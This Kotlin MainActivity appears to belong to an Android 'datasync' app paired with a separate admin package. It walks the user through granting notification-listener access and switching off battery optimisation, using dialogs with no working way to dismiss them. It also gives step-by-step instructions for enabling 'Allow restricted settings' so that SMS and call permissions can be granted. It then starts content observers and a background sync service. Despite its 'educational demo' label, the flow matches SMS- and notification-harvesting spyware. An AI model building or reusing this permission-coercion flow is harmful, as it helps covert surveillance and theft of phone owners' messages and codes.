package com.boxx.datasync

import android.app.Activity
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.background
import androidx.compose.foundation.isSystemInDarkTheme
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Info
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.permission.PermissionHandler
import com.boxx.datasync.permission.PermissionStatus
import com.boxx.datasync.permission.PermissionUiState
import com.boxx.datasync.permission.PermissionViewModel
import com.boxx.datasync.sync.SyncScheduler
import com.boxx.datasync.sync.SyncService
import com.boxx.datasync.ui.screen.MainScreen
import com.boxx.datasync.ui.viewmodel.MainViewModel
import dagger.hilt.android.AndroidEntryPoint
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()
    private val permissionViewModel: PermissionViewModel by viewModels()

    @Inject
    lateinit var repository: DataRepository

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "PROJECT_SCAN_DONE")
        Log.d("MainActivity", "FIREBASE_CONFIG_VERIFIED project_id=boxxx-40178 userPackage=com.boxx.datasync adminPackage=com.datasync.admin")
        viewModel.updateHeartbeat()

        setContent {
            MaterialTheme(
                colorScheme = if (isSystemInDarkTheme()) darkColorScheme() else lightColorScheme()
            ) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    val context = androidx.compose.ui.platform.LocalContext.current
                    val uiState by permissionViewModel.uiState.collectAsState()
                    val permissions by permissionViewModel.permissions.collectAsState()
                    val handler = remember { PermissionHandler(context) }

                    val launcher = rememberLauncherForActivityResult(
                        ActivityResultContracts.RequestMultiplePermissions()
                    ) { _ ->
                        permissionViewModel.refreshStatuses(this@MainActivity, isFromLauncher = true)
                    }

                    Log.d("PermissionFlow", "PERMISSION_DIALOG_STACK_PREVENTED - State: $uiState")

                    when (val state = uiState) {
                        is PermissionUiState.Checking -> {
                            PermissionLoadingScreen()
                        }
                        is PermissionUiState.RequestRuntimePermissions -> {
                            LaunchedEffect(Unit) {
                                val runtimePermissions = permissions
                                    .filter { !it.isSpecial && it.permission != null }
                                    .filter { handler.getStatus(it) != PermissionStatus.GRANTED }
                                    .mapNotNull { it.permission }
                                    .toTypedArray()
                                if (runtimePermissions.isNotEmpty()) {
                                    launcher.launch(runtimePermissions)
                                } else {
                                    permissionViewModel.refreshStatuses(this@MainActivity)
                                }
                            }
                            PermissionLoadingScreen()
                        }
                        is PermissionUiState.NeedNotificationListener -> {
                            SimplePermissionDialog(
                                title = "Notification Access Required",
                                text = "Required to sync incoming notifications to your dashboard.",
                                onConfirm = {
                                    Log.d("PermissionFlow", "PERMISSION_NOTIFICATION_LISTENER_OPENED")
                                    context.startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                                }
                            )
                        }
                        is PermissionUiState.NeedRestrictedSettingsGuide -> {
                            RestrictedSettingsGuide(
                                onOpenSettings = {
                                    Log.d("PermissionFlow", "PERMISSION_APP_SETTINGS_OPENED")
                                    context.startActivity(handler.getAppSettingsIntent())
                                },
                                onAlreadyEnabled = {
                                    permissionViewModel.markRestrictedGuideShown()
                                }
                            )
                        }
                        is PermissionUiState.NeedBatteryOptimization -> {
                            SimplePermissionDialog(
                                title = "Battery Optimization",
                                text = "Disable optimization to ensure reliable background sync.",
                                onConfirm = {
                                    val info = permissions.find { it.id == "BATTERY_OPTIMIZATION" }
                                    if (info != null) {
                                        context.startActivity(handler.getSettingsIntent(info))
                                    }
                                }
                            )
                        }
                        is PermissionUiState.NeedAppSettings -> {
                            SimplePermissionDialog(
                                title = "Permission Required",
                                text = "Please enable the required permission from Settings to keep sync working.",
                                onConfirm = {
                                    Log.d("PermissionFlow", "PERMISSION_APP_SETTINGS_OPENED")
                                    context.startActivity(handler.getAppSettingsIntent())
                                }
                            )
                        }
                        is PermissionUiState.Ready -> {
                            LaunchedEffect(Unit) {
                                (context.applicationContext as? UserApplication)?.setupContentObservers()
                            }
                            MainScreen(
                                viewModel = viewModel,
                                onSyncClick = {
                                    Log.d("MainActivity", "SYNC_BUTTON_CLICKED")
                                    viewModel.setSyncing()
                                    startSyncService(context)
                                },
                                showSettings = {
                                    val intent = handler.getAppSettingsIntent()
                                    startActivity(intent)
                                }
                            )
                        }
                    }
                }
            }
        }
        setupWorkManager()
    }

    override fun onResume() {
        super.onResume()
        Log.d("PermissionFlow", "PERMISSION_ON_RESUME_RECHECK")
        permissionViewModel.refreshStatuses(this)
    }

    private fun setupWorkManager() {
        SyncScheduler.schedulePeriodic(this)
    }

    @Composable
    private fun PermissionLoadingScreen() {
        Box(modifier = Modifier.fillMaxSize().padding(24.dp), contentAlignment = Alignment.Center) {
            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                Surface(
                    color = MaterialTheme.colorScheme.secondaryContainer.copy(alpha = 0.5f),
                    shape = RoundedCornerShape(12.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(Icons.Default.Info, contentDescription = null, tint = MaterialTheme.colorScheme.secondary)
                        Spacer(modifier = Modifier.width(12.dp))
                        Text(
                            "This educational demo syncs data only after user-granted permissions.",
                            style = MaterialTheme.typography.bodySmall,
                            color = MaterialTheme.colorScheme.onSecondaryContainer,
                            textAlign = TextAlign.Center
                        )
                    }
                }
                Spacer(modifier = Modifier.height(24.dp))
                CircularProgressIndicator()
                Spacer(modifier = Modifier.height(16.dp))
                Text("Setting up permissions...", style = MaterialTheme.typography.bodyMedium)
            }
        }
    }

    @Composable
    private fun SimplePermissionDialog(title: String, text: String, onConfirm: () -> Unit) {
        AlertDialog(
            onDismissRequest = { /* Prevent dismissal */ },
            title = { Text(title) },
            text = { Text(text) },
            confirmButton = {
                Button(onClick = onConfirm) {
                    Text("Open Settings")
                }
            },
            dismissButton = {
                TextButton(onClick = { /* Optional: handle cancel */ }) {
                    Text("Cancel")
                }
            }
        )
    }

    @OptIn(ExperimentalMaterial3Api::class)
    @Composable
    private fun RestrictedSettingsGuide(onOpenSettings: () -> Unit, onAlreadyEnabled: () -> Unit) {
        ModalBottomSheet(
            onDismissRequest = { /* Prevent dismissal by clicking outside if required, or just allow it */ },
            dragHandle = { BottomSheetDefaults.DragHandle() }
        ) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(24.dp)
                    .padding(bottom = 32.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Text("Restricted Permission Required", style = MaterialTheme.typography.titleLarge, fontWeight = FontWeight.Bold)
                Text(
                    "Your phone may block SMS/Call permissions until restricted settings are allowed.",
                    textAlign = TextAlign.Center,
                    style = MaterialTheme.typography.bodyMedium
                )

                Column(
                    modifier = Modifier.fillMaxWidth().background(MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f), RoundedCornerShape(12.dp)).padding(16.dp),
                    verticalArrangement = Arrangement.spacedBy(8.dp)
                ) {
                    Text("1. Open App Info", style = MaterialTheme.typography.bodySmall)
                    Text("2. Tap three dots / More options", style = MaterialTheme.typography.bodySmall)
                    Text("3. Tap “Allow restricted settings”", style = MaterialTheme.typography.bodySmall)
                    Text("4. Return and enable SMS/Call permissions", style = MaterialTheme.typography.bodySmall)
                }

                // Small Illustration
                Box(
                    modifier = Modifier
                        .size(140.dp, 90.dp)
                        .background(MaterialTheme.colorScheme.surfaceVariant, RoundedCornerShape(12.dp))
                        .padding(12.dp)
                ) {
                    Column(modifier = Modifier.align(Alignment.TopEnd)) {
                        repeat(3) {
                            Box(modifier = Modifier.size(5.dp).background(MaterialTheme.colorScheme.primary, CircleShape))
                            Spacer(modifier = Modifier.height(3.dp))
                        }
                    }
                    Box(
                        modifier = Modifier
                            .align(Alignment.Center)
                            .background(MaterialTheme.colorScheme.primaryContainer, RoundedCornerShape(4.dp))
                            .padding(4.dp)
                    ) {
                        Text("Allow restricted settings", style = MaterialTheme.typography.labelSmall, color = MaterialTheme.colorScheme.onPrimaryContainer)
                    }
                }

                Button(onClick = onOpenSettings, modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp)) {
                    Text("Open App Info")
                }
                TextButton(onClick = onAlreadyEnabled, modifier = Modifier.fillMaxWidth()) {
                    Text("I Already Enabled It")
                }
            }
        }
    }

    private fun startSyncService(context: android.content.Context) {
        val intent = Intent(context, SyncService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent)
        } else {
            context.startService(intent)
        }
        (applicationContext as? UserApplication)?.setupContentObservers()
    }

}
